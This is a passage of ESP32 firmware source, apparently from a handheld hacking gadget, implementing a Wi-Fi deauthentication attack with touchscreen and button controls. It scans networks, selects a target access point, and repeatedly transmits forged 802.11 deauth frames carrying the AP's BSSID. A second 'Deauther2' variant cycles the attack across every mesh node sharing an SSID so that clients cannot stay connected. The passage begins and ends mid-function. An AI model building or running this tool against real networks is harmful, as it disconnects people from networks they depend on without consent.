        tft.setCursor(180, LIST_HEADER_Y);
        tft.setTextColor(GREEN);
        tft.println(page_buf);

        int y = LIST_FIRST_ROW_Y;
        const int start_index = current_page * perPage;
        const int end_index = min(start_index + perPage, network_count);
        for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
          deautherDrawApRow(i, y, i == currentIndex);
          y += LIST_ROW_H;
        }
    }

    drawTabBar("Rescan", false, "Prev", currentIndex <= 0, "Next",
               currentIndex >= network_count - 1);
}

bool scanNetworks() {
    scanning = true;
    current_page = 0;
    currentIndex = 0;
    drawScanScreen();

    network_count = WifiScan::staWifiScanSync();
    if (network_count <= 0) {
        scanning = false;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {0};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }

    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

    scanning = false;
    return true;
}

// Bare WiFi.mode(WIFI_AP) leaves the AP interface configured but without an
// active BSS, which is not reliable for esp_wifi_80211_tx(WIFI_IF_AP, ...).
// Bring it up the same way beaconSpamSetup() does (the one raw-TX feature
// confirmed to reach the air): real softAP + promiscuous mode.
static void deautherEnsureApOnChannel(uint8_t channel) {
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    WiFi.softAP(".", nullptr, channel, 1, 4);
    esp_wifi_set_promiscuous(true);
    delay(100);
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    const int n = WifiScan::staWifiScanSync();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            deautherEnsureApOnChannel(*channel);
            return true;
        }
    }

    deautherEnsureApOnChannel(selectedChannel);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen() {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    wifiClearBody(TFT_BLACK);
    tft.setTextSize(1);

    char buf[64];
    tft.setTextColor(WHITE);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 50);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 70);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 85);
    tft.println(buf);

    tft.setCursor(10, 100);
    tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
    tft.println(attack_running ? "Status: Running" : "Status: Stopped");

    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
    tft.setCursor(10, 115);
    tft.setTextColor(WHITE);
    tft.println(buf);

    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
    tft.setCursor(10, 130);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 145);
    tft.println(buf);

    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void deautherHandleNavButtons() {
    const unsigned long now = millis();
    if (now - deautherLastButtonPress < deautherDebounceTime) {
        // Keep edge state in sync while debounce is active so a held press
        // cannot fire again as soon as the window expires.
        (void)isButtonPressedEdge(BTN_LEFT);
        (void)isButtonPressedEdge(BTN_RIGHT);
        (void)isButtonPressedEdge(BTN_UP);
        (void)isButtonPressedEdge(BTN_DOWN);
        (void)isButtonPressedEdge(BTN_SELECT);
        return;
    }

    // Layout remapeado: tela de ataque (View) -- LEFT volta pra lista de scan
    // (antes era o RIGHT); SELECT inicia/para o ataque (antes era o LEFT).
    // UP/DOWN/RIGHT ficaram sem funcao aqui.
    if (selected_ap_index >= 0) {
        if (isButtonPressedEdge(BTN_LEFT)) {
            attack_running = false;
            last_packet_time = 0;
            selected_ap_index = -1;
            drawScanScreen();
            deautherLastButtonPress = now;
            return;
        }
        if (isButtonPressedEdge(BTN_SELECT)) {
            attack_running = !attack_running;
            if (attack_running) {
                deautherEnsureApOnChannel(selectedChannel);
            } else {
                last_packet_time = 0;
            }
            drawAttackScreen();
            deautherLastButtonPress = now;
            return;
        }
        return;
    }

    if (scanning) {
        return;
    }

    // Layout remapeado: lista de scan -- LEFT sai do Deauther (antes era o
    // SELECT, agora global); RIGHT rescaneia (antes era o LEFT); SELECT abre
    // o alvo selecionado / View (antes era o RIGHT). UP/DOWN continuam
    // Prev/Next, sem mudanca.
    if (isButtonPressedEdge(BTN_LEFT)) {
        feature_exit_requested = true;
        deautherLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
        currentIndex--;
        drawScanScreen();
        deautherLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_DOWN) && currentIndex < network_count - 1) {
        currentIndex++;
        drawScanScreen();
        deautherLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_RIGHT)) {
        if (scanNetworks()) {
            drawScanScreen();
        }
        deautherLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_SELECT) && network_count > 0) {
        deautherOpenTarget(currentIndex);
        deautherLastButtonPress = now;
    }
}


void handleTouch() {
    int x, y;
    if (!readTouchXY(x, y)) return;

    static unsigned long lastTouchActionMs = 0;
    const unsigned long now = millis();
    if (now - lastTouchActionMs < 300) {
        return;
    }

    bool redraw = false;
    if (selected_ap_index == -1) {
        const int listMaxY = LIST_FIRST_ROW_Y + (deautherNetworksPerPage() * LIST_ROW_H);
        if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && network_count > 0) {
            int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * deautherNetworksPerPage());
            if (index >= 0 && index < network_count) {
                deautherOpenTarget(index);
                lastTouchActionMs = now;
            }
        } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, "Rescan", true, false);
                if (scanNetworks()) {
                    drawScanScreen();
                }
                lastTouchActionMs = now;
                redraw = true;
            } else if (x >= 122 && x <= 179 && currentIndex > 0) {
                drawButton(117, 304, 57, 16, "Prev", true, false);
                currentIndex--;
                drawScanScreen();
                lastTouchActionMs = now;
                redraw = true;
            } else if (x >= 183 && x <= 240 && currentIndex < network_count - 1) {
                drawButton(178, 304, 57, 16, "Next", true, false);
                currentIndex++;
                drawScanScreen();
                lastTouchActionMs = now;
                redraw = true;
            }
        }
    } else {
        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                attack_running = !attack_running;
                if (attack_running) {
                    deautherEnsureApOnChannel(selectedChannel);
                } else {
                    last_packet_time = 0;
                }
                drawAttackScreen();
                lastTouchActionMs = now;
                redraw = true;
            } else if (x >= 183 && x <= 240) {
                drawButton(177, 304, 57, 16, "Back", true, false);
                attack_running = false;
                last_packet_time = 0;
                selected_ap_index = -1;
                drawScanScreen();
                lastTouchActionMs = now;
                redraw = true;
            }
        }
    }

    if (redraw) {
        delay(50);
    }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
           }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 1) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void deautherSetup() {
    pauseBackgroundRadioTasks();
    setTouchButtonInputEnabled(true);
    deautherUpdateNavLabels(false);
    featureClearContent(TFT_BLACK);

    setupTouchscreen();
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    redrawTouchButtonBar();
    runUI();

    tft.drawFastHLine(0, 19, 240, UI_LINE);

    tft.setTextColor(GREEN, BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("Initializing...");

    attack_running     = false;
    selected_ap_index  = -1;
    current_page       = 0;
    currentIndex       = 0;
    scanning           = false;

    if (!WifiScan::loadApListFromWifiCache(&ap_list, &network_count, compare_ap)) {
        scanNetworks();
    }

    drawScanScreen();

    drawScanScreen();
    redrawTouchButtonBar();
}

void deautherLoop() {

    // Layout remapeado: a saida agora e tratada dentro de
    // deautherHandleNavButtons() -- LEFT na lista de scan sai do Deauther;
    // LEFT na tela de ataque (View) so volta pra lista (nao sai do feature).
    // SELECT deixou de ser exit global (agora e "View"/start-stop).

    tft.drawFastHLine(0, 19, 240, UI_LINE);

    deautherHandleNavButtons();
    handleTouch();
    updateStatusBar();
    runUI();

    tft.drawFastHLine(0, 19, 240, UI_LINE);

    uint32_t current_time = millis();
    if (attack_running && selected_ap_index != -1) {
        uint32_t heap = ESP.getFreeHeap();
        // Baseline free heap on this build (BLE + background scanners + UI) is
        // ~77 KB, so the original 80 KB guard aborted the attack before any TX.
        // Raw 26-byte deauth frames need almost no heap; 30 KB keeps a real
        // OOM safety margin while allowing the feature to run.
        if (heap < 30000) {
            attack_running = false;
            last_packet_time = 0;
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            last_packet_time = 0;
            delay(3000);
            return;
        }

        if (current_time - last_packet_time >= 100 && attack_running) {
            wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
            last_packet_time = current_time;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && current_time - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {0};
                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("ESP32-DIV");
                /* Hidden and open, matching startListening() below. This
                 * interface exists to push raw frames through WIFI_IF_AP and
                 * nothing is meant to associate with it, so it does not need
                 * a passphrase and should not be advertising one. It had a
                 * fixed key in the source, which made every AP this brought
                 * up a visible WPA2 network with a published password. */
                ap_config.ap.password[0] = '\0';
                ap_config.ap.authmode = WIFI_AUTH_OPEN;
                ap_config.ap.ssid_hidden = 1;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

            }
        }
        last_channel_check = current_time;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && current_time - last_status_time > 2000) {
        drawAttackScreen();
        last_status_time = current_time;
      }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Deauther2 — separate copy of the WiFi 2.4GHz Deauther with one addition:
// when a network name has multiple access points (mesh / roaming), it can
// send deauthentication frames to ALL of them, cycling through the group so
// the client drops regardless of which node it is associated with. The
// original Deauther is left untouched. Shares the ieee80211 sanity-check
// override already defined in namespace Deauther above.
// ─────────────────────────────────────────────────────────────────────────────
namespace Deauther2 {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

#define DEAUTH2_MAX_GROUP 16   // max nodes attacked at once by SSID group
#define DEAUTH2_MAX_UNIQUE 32  // max unique SSIDs shown in the scan list

static unsigned long deautherLastButtonPress = 0;
static const unsigned long deautherDebounceTime = 200;

static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;

static int deautherNetworksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void deautherUpdateNavLabels(bool onAttackScreen);
void drawScanScreen();
void drawAttackScreen();

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0;
int currentIndex = 0;

// Group attack state: every AP whose SSID matches the selected network.
wifi_ap_record_t groupTargets[DEAUTH2_MAX_GROUP];
int groupTargetCount = 0;
int groupTargetIndex = 0;
bool attackGroup = false;   // true = cycle through the whole same-SSID group
int groupSelectedIndex = 0; // cursor: which node [THIS ONLY] targets (persists across mode toggles)
int nodeScrollOffset = 0;   // first node shown in the attack-screen window

// Deduplicated scan view: one list entry per unique SSID (hidden networks stay
// separate). dedupIndex[d] holds the ap_list index of the strongest AP for the
// d-th unique SSID; dedupCount is how many unique entries the list shows.
int dedupIndex[DEAUTH2_MAX_UNIQUE];
int dedupCount = 0;

static void buildDedupView() {
  dedupCount = 0;
  for (int i = 0; i < network_count && dedupCount < DEAUTH2_MAX_UNIQUE; i++) {
    if (ap_list[i].ssid[0] == '\0') {
      // Hidden network: no SSID to group by, keep it as its own entry.
      dedupIndex[dedupCount++] = i;
      continue;
    }
    bool seen = false;
    for (int j = 0; j < dedupCount; j++) {
      if (strcmp((char*)ap_list[dedupIndex[j]].ssid, (char*)ap_list[i].ssid) == 0) {
        seen = true;
        break;
      }
    }
    if (!seen) {
      dedupIndex[dedupCount++] = i;
    }
  }
}

static void deautherUpdateNavLabels(bool onAttackScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Lista de scan: LEFT=Exit, DOWN=Next, SELECT=View, UP=Prev, RIGHT=Rescan.
  // Tela de ataque: LEFT=Back, SELECT=Start/Stop, RIGHT=Modo (grupo/nó).
  if (onAttackScreen) {
    const bool hasGroup = (groupTargetCount > 1);
    setTouchNavLabels("Back",
                      hasGroup ? "Node+" : nullptr,
                      attack_running ? "Stop" : "Start",
                      hasGroup ? "Node-" : nullptr,
                      "Modo");
  } else {
    setTouchNavLabels("Exit", "Next", "View", "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static int countSameSsid(const char* ssid) {
  // Hidden networks (empty SSID) are distinct APs, not a real "group" — never
  // count them as duplicates.
  if (ssid == nullptr || ssid[0] == '\0') return 1;
  int n = 0;
  for (int i = 0; i < network_count; i++) {
    if (ap_list[i].ssid[0] != '\0' && strcmp((char*)ap_list[i].ssid, ssid) == 0) n++;
  }
  return n;
}

static void deautherDrawApRow(int apIdx, int rowNum, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  const int dup = countSameSsid((char*)ap_list[apIdx].ssid);
  const char* src = (char*)ap_list[apIdx].ssid;

  // SSID hard-truncated to 12 chars so full names like "Adrastea_IoT" still
  // fit beside the fixed "xN" marker column, keeping every row aligned.
  // Longer names lose only the tail (e.g. "Adrastea_Gue" for "Adrastea_Guest").
  strncpy(ssid, src, 12);
  ssid[12] = '\0';

  char mark[4] = "";
  if (dup > 1) {
    snprintf(mark, sizeof(mark), "x%d", dup);
  }

  const char* enc = ap_list[apIdx].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-12s %-2s %3d dBm Ch%2d %s",
           rowNum + 1, ssid, mark, ap_list[apIdx].rssi, ap_list[apIdx].primary, enc);

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");
  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : (ap_list[apIdx].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
  tft.println(buf);
}

static void deautherOpenTarget(int index) {
  // `index` is a deduplicated list index (0..dedupCount-1).
  if (index < 0 || index >= dedupCount) {
    return;
  }
  const int apIdx = dedupIndex[index];
  currentIndex = index;
  selected_ap_index = apIdx;
  selectedAp = ap_list[apIdx];
  selectedChannel = ap_list[apIdx].primary;

  // Build the same-SSID group. Default to "attack all" when there are dupes.
  // Hidden networks (empty SSID) are never grouped.
  groupTargetCount = 0;
  if (ap_list[apIdx].ssid[0] != '\0') {
    for (int i = 0; i < network_count && groupTargetCount < DEAUTH2_MAX_GROUP; i++) {
      if (ap_list[i].ssid[0] != '\0' &&
          strcmp((char*)ap_list[i].ssid, (char*)ap_list[apIdx].ssid) == 0) {
        groupTargets[groupTargetCount++] = ap_list[i];
      }
    }
  }
  attackGroup = (groupTargetCount > 1);
  groupTargetIndex = 0;
  groupSelectedIndex = 0;
  nodeScrollOffset = 0;

  drawAttackScreen();
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
  esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
  packet_count++;
  if (res == ESP_OK) {
    success_count++;
    consecutive_failures = 0;
  } else {
    consecutive_failures++;
  }
  Serial.printf("[d2] tx res=%d ok=%u/%u\n", (int)res, success_count, packet_count);
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  memcpy(&deauth_frame[10], ap_record->bssid, 6);
  memcpy(&deauth_frame[16], ap_record->bssid, 6);
  deauth_frame[24] = 7;   // reason code = 7 (Class 3 frame from nonassociated STA)
  Serial.printf("[d2] ch=%u bssid=%02X:%02X:%02X:%02X:%02X:%02X\n",
                chan, ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
  wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
  wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
  return ap2->rssi - ap1->rssi;
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    deautherUpdateNavLabels(selected_ap_index >= 0);
    return;
  }

  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

  if (leftButton && leftButton[0]) {
    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
  }
  if (prevButton && prevButton[0]) {
    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  }
  if (nextButton && nextButton[0]) {
    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
  }
}

void drawScanScreen() {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  tft.setTextSize(1);

  if (scanning) {
    tft.setCursor(10, 50);
    tft.setTextColor(GREEN);
    tft.println("Scanning.");
    loading(100, ORANGE, 0, 0, 3, true);
    tft.setCursor(10, 65);
    tft.println("Wait a moment.");
    return;
  }

  if (dedupCount == 0) {
    tft.setTextColor(GREEN);
    tft.setCursor(10, 50);
    tft.println("No networks found.");
    tft.setCursor(10, 65);
    tft.println("Press Rescan.");
  } else {
    const int perPage = deautherNetworksPerPage();
    if (currentIndex < 0) {
      currentIndex = 0;
    }
    if (currentIndex >= dedupCount) {
      currentIndex = max(0, dedupCount - 1);
    }
    current_page = currentIndex / max(1, perPage);

    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Networks:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
             current_page + 1, max(1, (dedupCount + perPage - 1) / perPage));
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    int y = LIST_FIRST_ROW_Y;
    const int start_index = current_page * perPage;
    const int end_index = min(start_index + perPage, dedupCount);
    for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
      deautherDrawApRow(dedupIndex[i], i, y, i == currentIndex);
      y += LIST_ROW_H;
    }
  }

  drawTabBar("Rescan", false, "Prev", currentIndex <= 0, "Next",
             currentIndex >= dedupCount - 1);
}

bool scanNetworks() {
  scanning = true;
  current_page = 0;
  currentIndex = 0;
  drawScanScreen();

  network_count = WifiScan::staWifiScanSync();
  if (network_count <= 0) {
    scanning = false;
    return false;
  }

  if (ap_list) free(ap_list);
  ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
  if (!ap_list) {
    scanning = false;
    return false;
  }

  for (int i = 0; i < network_count; i++) {
    wifi_ap_record_t ap_record = {0};
    memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
    strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
    ap_record.rssi = WiFi.RSSI(i);
    ap_record.primary = WiFi.channel(i);
    ap_record.authmode = WiFi.encryptionType(i);
    ap_list[i] = ap_record;
  }

  qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

  buildDedupView();

  scanning = false;
  return true;
}

static void deautherEnsureApOnChannel(uint8_t channel) {
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  WiFi.softAP(".", nullptr, channel, 1, 4);
  esp_wifi_set_promiscuous(true);
  delay(100);
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
  const int n = WifiScan::staWifiScanSync();
  for (int i = 0; i < n; i++) {
    if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
      *channel = WiFi.channel(i);
      deautherEnsureApOnChannel(*channel);
      return true;
    }
  }

  deautherEnsureApOnChannel(selectedChannel);
  return false;
}

void resetWifi() {
  esp_wifi_stop();
  delay(200);
  esp_wifi_start();
  delay(200);
  packet_count = 0;
  success_count = 0;
  consecutive_failures = 0;
}

static void deautherMoveNodeSelection(int delta) {
  if (groupTargetCount <= 1) return;
  groupSelectedIndex = (groupSelectedIndex + delta + groupTargetCount) % groupTargetCount;
  const int VISIBLE = 4;
  if (groupSelectedIndex < nodeScrollOffset) nodeScrollOffset = groupSelectedIndex;
  if (groupSelectedIndex >= nodeScrollOffset + VISIBLE) nodeScrollOffset = groupSelectedIndex - VISIBLE + 1;
  if (nodeScrollOffset < 0) nodeScrollOffset = 0;
  selectedAp = groupTargets[groupSelectedIndex];
  selectedChannel = groupTargets[groupSelectedIndex].primary;
}

void drawAttackScreen() {
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  wifiClearBody(TFT_BLACK);
  tft.setTextSize(1);

  char buf[64];
  tft.setTextColor(WHITE);
  snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
  tft.setCursor(10, 45);
  tft.println(buf);

  if (groupTargetCount > 1) {
    snprintf(buf, sizeof(buf), "Mode: [%s]  Nodes: %d",
             attackGroup ? "ALL" : "THIS ONLY", groupTargetCount);
    tft.setTextColor(attackGroup ? ORANGE : WHITE);
    tft.setCursor(10, 60);
    tft.println(buf);

    // Node window (up to 4 rows, scrolls to keep the cursor visible).
    const int VISIBLE = 4;
    int y = 75;
    for (int k = 0; k < VISIBLE && nodeScrollOffset + k < groupTargetCount; k++) {
      const int idx = nodeScrollOffset + k;
      const bool sel = (idx == groupSelectedIndex) && !attackGroup;
      snprintf(buf, sizeof(buf), "%c %d: %02X:%02X:%02X:%02X:%02X:%02X ch%d %d",
               sel ? '>' : ' ',
               idx + 1,
               groupTargets[idx].bssid[0], groupTargets[idx].bssid[1],
               groupTargets[idx].bssid[2], groupTargets[idx].bssid[3],
               groupTargets[idx].bssid[4], groupTargets[idx].bssid[5],
               groupTargets[idx].primary, groupTargets[idx].rssi);
      tft.setCursor(10, y);
      tft.setTextColor(sel ? ORANGE : (attackGroup ? UI_DIM_TEXT : WHITE));
      tft.println(buf);
      y += 15;
    }
  } else {
    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 60);
    tft.setTextColor(WHITE);
    tft.println(buf);
  }

  const char* auth;
  switch (selectedAp.authmode) {
    case WIFI_AUTH_OPEN: auth = "OPEN"; break;
    case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
    case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
    case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
    default: auth = "Unknown"; break;
  }
  snprintf(buf, sizeof(buf), "Auth: %s", auth);
  tft.setCursor(10, 140);
  tft.setTextColor(WHITE);
  tft.println(buf);

  tft.setCursor(10, 155);
  tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
  tft.println(attack_running ? "Status: Running" : "Status: Stopped");

  float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
  snprintf(buf, sizeof(buf), "Packets: %u  %.0f%%", packet_count, success_rate);
  tft.setCursor(10, 170);
  tft.setTextColor(WHITE);
  tft.println(buf);

  snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
  tft.setCursor(10, 185);
  tft.println(buf);

  const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
  drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void deautherHandleNavButtons() {
  const unsigned long now = millis();
  if (now - deautherLastButtonPress < deautherDebounceTime) {
    (void)isButtonPressedEdge(BTN_LEFT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    (void)isButtonPressedEdge(BTN_SELECT);
    return;
  }

  // Tela de ataque (View): LEFT volta pra lista, SELECT inicia/para,
  // RIGHT alterna entre "atacar todas" e "só este nó".
  if (selected_ap_index >= 0) {
    if (isButtonPressedEdge(BTN_LEFT)) {
      attack_running = false;
      last_packet_time = 0;
      selected_ap_index = -1;
      drawScanScreen();
      deautherLastButtonPress = now;
      return;
    }
